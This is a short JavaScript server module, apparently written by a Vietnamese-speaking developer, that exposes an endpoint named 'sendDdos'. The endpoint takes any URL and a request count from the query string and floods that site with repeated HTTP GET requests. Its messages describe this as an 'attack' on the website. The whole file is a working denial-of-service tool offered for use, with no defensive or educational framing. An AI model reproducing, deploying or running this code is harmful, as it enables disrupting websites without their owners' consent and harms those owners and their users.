import axios from "axios";
function Ddos(link, max) {
  let count2 = 0;
  let count = 0;
  let time = 0;
  const inter = setInterval(() => {
    count++;
    count2 = count2 + 1;
    time = 0;
    if(count2 >= 1000) {
      time = 5000;
      count2 = 0;
    }
    axios.get(link).catch(() => {
    })
    if (count > max) {
      clearInterval(inter);
    }
  }, time);
}
function isValidURL(str) {
  const urlPattern =
    /^(https?:\/\/)?([\w-]+(\.[\w-]+)+)([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?$/;
  return urlPattern.test(str);
}
export const sendDdos = async (req, res) => {
  if (isNaN(req.query.max)) {
    return res.json({
      code: 400,
      message: "Số lần tấn công phải là số",
    });
  }
  if (isValidURL(req.query.link)) {
    Ddos(req.query.link, req.query.max);
  } else {
    return res.json({
      code: 400,
      message: "Link sai định dạng",
    });
  }
  res.json({
    code:200,
    message: `Đã gửi request tấn công website: ${req.query.link}`
  })
};
